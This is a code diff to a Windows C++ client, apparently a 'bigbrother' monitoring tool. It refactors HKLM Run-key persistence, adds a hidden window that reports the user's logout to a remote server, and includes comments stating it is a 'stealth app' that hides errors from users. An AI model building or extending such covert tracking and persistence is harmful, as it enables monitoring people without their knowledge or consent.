@@ -5,6 +5,8 @@
 #include <chrono>
 #include <mutex>
 #include <cstdlib>
+#include <fstream>
+#include <iomanip>
 #include <boost/property_tree/ptree.hpp>
 #include <boost/property_tree/json_parser.hpp>
 #include "../httpclient.h"
@@ -21,59 +23,34 @@ std::string serverAddress;
 
 using WebServer = webserverlib::WebServer;
 
+LRESULT Wndproc(
+    HWND hWnd,
+    UINT message,
+    WPARAM wParam,
+    LPARAM lParam)
+{
+    switch(message)
+    {
+    case WM_ENDSESSION:
+        {
+            HttpRequest loginReportRequest{ serverAddress, std::to_string(serverPort), std::string("/api/logout/") + userName, 11 };
+            loginReportRequest.Get();
+            return 0;
+        }
+    }
+    return DefWindowProc(hWnd, message, wParam, lParam);
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
 {
     try
     {
         std::string command{ pCmdLine };
         if (command == "--install")
-        {
-            char fileName[256];
-            if (!GetModuleFileNameA(NULL, fileName, sizeof(fileName)))
-                return -1;
-
-            HKEY hKey;
-            std::string fullPath{ fileName };
-            LSTATUS result = RegOpenKeyExA(
-                HKEY_LOCAL_MACHINE,
-                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0,
-                KEY_WRITE,
-                &hKey);
-
-            if (result == ERROR_SUCCESS)
-            {
-                result = RegSetValueExA(
-                    hKey,
-                    "bigbrother",
-                    0,
-                    REG_SZ,
-                    (unsigned char*)fullPath.c_str(),
-                    fullPath.size()
-                );
-            }
-            return 0;
-        }
+            return winapi::Install();
 
         if (command == "--remove")
-        {
-            HKEY hKey;
-            LSTATUS result = RegOpenKeyExA(
-                HKEY_LOCAL_MACHINE,
-                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0,
-                DELETE,
-                &hKey);
-
-            if (result == ERROR_SUCCESS)
-            {
-                LSTATUS result = RegDeleteKeyA(
-                    hKey,
-                    "bigbrother"
-                );
-            }
-            return 0;
-        }
+            return winapi::Uninstall();
 
         std::stringstream buffer;
 
@@ -86,6 +63,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
             serverPort = configJsonRoot.get<unsigned short>("serverport");
             listenPort = configJsonRoot.get<unsigned short>("listenport");
         }
+
+        HWND hWnd = winapi::CreateInvisibleWindow(hInstance, "mainwindowclass123", Wndproc);
 
         GetUserNameA(userName, &userNameSize);
         {
@@ -135,24 +114,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
                 }));
 
         MSG msg = { };
-        while (GetMessage(&msg, NULL, 0, 0) > 0)
+        while (GetMessage(&msg, hWnd, 0, 0) > 0)
         {
-            switch (msg.message)
-            {
-            case WM_ACTIVATE:
-                if (wParam == WA_INACTIVE)
-                {
-                    HttpRequest logoutReportRequest{ serverAddress, std::to_string(serverPort) , std::string("/api/logout/") + userName, 11 };
-                    logoutReportRequest.Get();
-                }
-                return 0;
-            }
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
         }
     }
     catch (const std::exception&)
     {
-        //something goes wrong, we dont want to show error messages to user
-        //because this it stealth app
+        //something goes wrong, but we dont want to show error messages to user
+        //because this is stealth app
     }
     return 0;
 }
